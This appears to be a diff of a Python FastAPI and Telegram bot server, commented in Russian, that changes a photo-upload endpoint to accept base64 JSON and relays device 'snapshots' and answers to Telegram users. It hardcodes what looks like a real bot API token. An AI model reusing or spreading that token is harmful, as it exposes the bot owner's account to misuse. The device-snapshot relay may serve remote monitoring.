@@ -3,6 +3,7 @@ import json
 from fastapi import FastAPI, Request
 import telebot
 from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton, Update
+import base64
 
 # ТОКЕН ТВОЕГО БОТА (Проверь, чтобы он был точным!)
 API_TOKEN = "8768531793:AAH619M9uFehDFnUndSxyiSkisHiQJLk4lE"
@@ -106,8 +107,18 @@ async def send_result(user_id: str, request: Request):
     bot.send_message(int(user_id), f"📱 **Ответ:**\n\n{data.get('text', '')}", parse_mode="Markdown")
     return {"status": "ok"}
 
+
 @app.post("/send_photo/{user_id}")
 async def send_photo(user_id: str, request: Request):
-    form = await request.form()
-    bot.send_photo(int(user_id), await form["photo"].read(), caption="📸 Снимок с устройства!")
-    return {"status": "ok"}
+    data = await request.json()
+    photo_base64 = data.get("photo", "")
+    
+    if photo_base64:
+        # Декодируем строку обратно в байты изображения
+        photo_bytes = base64.b64decode(photo_base64)
+        device_name = ALLOWED_DEVICES.get(user_id, "Устройство")
+        
+        bot.send_photo(int(user_id), photo_bytes, caption=f"📸 Снимок с устройства {device_name}!")
+        return {"status": "ok"}
+    
+    return {"status": "error", "message": "No photo data"}
